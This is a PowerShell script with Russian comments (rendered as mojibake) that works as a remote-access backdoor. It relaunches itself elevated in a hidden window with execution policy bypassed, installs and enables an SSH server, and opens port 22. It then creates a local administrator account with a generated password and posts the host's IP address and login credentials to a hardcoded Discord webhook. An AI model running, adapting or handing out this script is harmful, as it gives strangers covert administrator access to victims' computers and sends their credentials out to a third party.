# –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∑–∞–ø—É—â–µ–Ω –ª–∏ —Å–∫—Ä–∏–ø—Ç —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "‚ùå –¢—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞. –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏..." -ForegroundColor Yellow
    Start-Process powershell -ArgumentList "-NoP -Ep Bypass -W H -File `"$PSCommandPath`"" -Verb runAs
    exit
}

try {
    $StopWatch = [system.diagnostics.stopwatch]::startNew()

    # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º SSH Server
    if ($IsLinux) {
        Write-Host "üîÑ –£—Å—Ç–∞–Ω–æ–≤–∫–∞ OpenSSH Server –Ω–∞ Linux..."
        & sudo apt install openssh-server -y
    } else {
        Write-Host "üîÑ –£—Å—Ç–∞–Ω–æ–≤–∫–∞ OpenSSH Server –Ω–∞ Windows..."
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
        Start-Service sshd
        Set-Service -Name sshd -StartupType 'Automatic'

        # –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º firewall, –µ—Å–ª–∏ –ø—Ä–∞–≤–∏–ª–∞ –Ω–µ—Ç
        if (-not (Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
        }
    }

    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å–ª—É—á–∞–π–Ω—ã–π –ø–∞—Ä–æ–ª—å
    Write-Host "üîë –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø–∞—Ä–æ–ª—è –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è..."
    $Password = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 12 | ForEach-Object { [char]$_ })

    # –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è (—Ç–æ–ª—å–∫–æ Windows)
    if (-not $IsLinux) {
        $Username = "sshuser"
        Write-Host "‚ûï –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è '$Username'..."
        net user $Username $Password /add
        net localgroup administrators $Username /add
    }

    # –ü–æ–ª—É—á–∞–µ–º IP-–∞–¥—Ä–µ—Å
    Write-Host "üåê –ü–æ–ª—É—á–µ–Ω–∏–µ IP-–∞–¥—Ä–µ—Å–∞..."
    $IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" }).IPAddress

    # –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ—Ä—Ç–∞
    $Port = 22

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Discord
    Write-Host "üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Discord —á–µ—Ä–µ–∑ –≤–µ–±—Ö—É–∫..."
    $WebhookURL = 'https://discord.com/api/webhooks/1311849224886812702/dsmLjee1J1LmsF5oxFnj14QwPEcbKoZgsCnYcgEv-wdexA7rHko3ZR9Nquyd4cyRvaCs'
    $Message = @{
        content = "üõ†Ô∏è OpenSSH Server —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!\nIP: $IPAddress\nPort: $Port\nUser: $Username\nPassword: $Password"
    }
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body (ConvertTo-Json $Message -Depth 10) -ContentType 'application/json'

    [int]$Elapsed = $StopWatch.Elapsed.TotalSeconds
    Write-Host "‚úÖ –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ –∑–∞ $Elapsed —Å–µ–∫." -ForegroundColor Green
} catch {
    Write-Host "‚ö†Ô∏è –û—à–∏–±–∫–∞ –≤ —Å—Ç—Ä–æ–∫–µ $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "–î–µ—Ç–∞–ª–∏ –æ—à–∏–±–∫–∏: $($_.Exception.StackTrace)" -ForegroundColor DarkYellow
} finally {
    Write-Host "üîΩ –ù–∞–∂–º–∏—Ç–µ –ª—é–±—É—é –∫–ª–∞–≤–∏—à—É –¥–ª—è –≤—ã—Ö–æ–¥–∞..." -ForegroundColor Yellow
    Pause
}
